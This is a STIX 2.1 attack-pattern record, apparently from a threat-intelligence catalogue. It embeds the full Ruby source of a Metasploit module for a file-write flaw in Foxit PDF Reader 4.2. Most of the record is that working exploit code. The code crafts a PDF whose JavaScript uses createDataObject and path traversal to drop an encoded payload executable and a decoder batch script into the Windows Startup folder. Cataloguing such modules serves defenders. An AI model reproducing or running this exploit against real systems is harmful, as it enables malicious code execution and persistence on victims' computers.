{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--15211dc0-adc9-4169-a5ed-7a72a4c84db5",
    "created": "2024-08-14T16:35:58.951244Z",
    "modified": "2024-08-14T16:35:58.951248Z",
    "name": "Foxit PDF Reader 4.2 Javascript File Write",
    "description": " This module exploits an unsafe Javascript API implemented in Foxit PDF Reader version 4.2. The createDataObject() Javascript API function allows for writing arbitrary files to the file system. This issue was fixed in version 4.3.1.0218.  Note: This exploit uses the All Users directory currently, which required administrator privileges to write to. This means an administrative user has to open the file to be successful. Kind of lame but thats how it goes sometimes in the world of file write bugs.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/fileformat/foxit_reader_filewrite.rb",
            "external_id": "foxit_reader_filewrite.rb"
        },
        {
            "source_name": "reference",
            "url": "http://scarybeastsecurity.blogspot.com/2011/03/dangerous-file-write-bug-in-foxit-pdf.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::FILEFORMAT\n  include Msf::Exploit::EXE\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => 'Foxit PDF Reader 4.2 Javascript File Write',\n      'Description'    => %q{\n          This module exploits an unsafe Javascript API implemented in Foxit PDF Reader\n          version 4.2. The createDataObject() Javascript API function allows for writing\n          arbitrary files to the file system. This issue was fixed in version 4.3.1.0218.\n\n          Note: This exploit uses the All Users directory currently, which required\n          administrator privileges to write to. This means an administrative user has to\n          open the file to be successful. Kind of lame but thats how it goes sometimes in\n          the world of file write bugs.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n      [\n        'bannedit',  # metasploit module\n        'Chris Evans' # Initial discovery and exploit\n      ],\n      'References'     =>\n        [\n          [ 'OSVDB', '71104' ],\n          [ 'URL', 'http://scarybeastsecurity.blogspot.com/2011/03/dangerous-file-write-bug-in-foxit-pdf.html' ],\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process',\n          'DisablePayloadHandler' => true\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          ['Automatic', { 'auto' => true } ], # uses both\n          ['Foxit PDF Reader v4.2 (Windows XP SP0-SP3)', {}],\n          ['Foxit PDF Reader v4.2 (Windows Vista/7/8/2008)', {}],\n        ],\n      'DisclosureDate' => '2011-03-05',\n      'DefaultTarget'  => 0))\n\n      register_options([\n        OptString.new('FILENAME', [ true, 'The file name.',  'msf.pdf']),\n        OptString.new('DECODER', [ true, 'The decoder script.',  'vbs_b64']),\n      ])\n  end\n\n  def exploit\n    decoder_file = rand_text_alpha(rand(6) + 1)\n    payload_file = rand_text_alpha(rand(6) + 1)\n\n    ext = '.b64'\n    exe = generate_payload_exe\n    payload_b64 = Rex::Text.encode_base64(exe)\n    decoder = build_decoder(decoder_file, payload_file)\n    path_old = 'c:/Documents and Settings/All Users/Start Menu/Programs/Startup/'\n    path_new = 'c:/Users/All Users/Start Menu/Programs/Startup/'\n    pdf = %Q|\n%PDF 1 0 obj<</Pages 1 0 R /OpenAction 2 0 R>> 2 0 obj<</S /JavaScript /JS (\ncreateDataObject\\('#{path_old + \"../../../../../WINDOWS/Temp/\" + payload_file + ext}', \"#{payload_b64}\"\\);\ncreateDataObject\\('#{path_old + decoder_file + '.bat'}', unescape\\(\\\"#{decoder}\\\"\\)\\);\ncreateDataObject\\('#{path_new + \"../../../../../WINDOWS/Temp/\" + payload_file + ext}', \"#{payload_b64}\"\\);\ncreateDataObject\\('#{path_new + decoder_file + '.bat'}', unescape\\(\\\"#{decoder}\\\"\\)\\);) >> trailer<</Root 1 0 R>>|\n    file_create(pdf)\n  end\n\n  def build_decoder(decoder_file, payload_file)\n    file = []\n    decoder_bat = Msf::Config.data_directory + \"/exploits/cmdstager/\"\n    case datastore['DECODER']\n    when 'vbs_b64_adodb'\n      decoder_bat << datastore['DECODER']\n    when 'vbs_b64'\n      decoder_bat << datastore['DECODER']\n    else\n      print_status(\"Selected decoder is incompatible with this exploit.\")\n      print_status(\"Defaulting to vbs_b64 decoder.\")\n      decoder_bat << 'vbs_b64'\n    end\n\n    decoder = File.new(decoder_bat, \"r\").read\n    decoder << \"cscript //nologo C:/Windows/Temp/\" + decoder_file + '.vbs'\n\n    decoder.gsub!(/\\\"/, '\\\"')\n    decoder.gsub!(/\\n/, \" && \")\n    decoder.gsub!(/ENCODED/, \"C:/Windows/Temp/\" + payload_file + '.b64') # payload.b64\n    decoder.gsub!(/DECODED/, \"C:/Windows/Temp/\" + payload_file + '.exe') # payload.exe\n    decoder.gsub!(/decode_stub/, \"C:/Windows/Temp/\" + decoder_file + '.vbs')\n\n    return decoder = Rex::Text.uri_encode(decoder)\n  end\nend\n",
    "x_mitre_disclosure_date": "2011-03-05",
    "x_mitre_platforms": [
        "win'"
    ]
}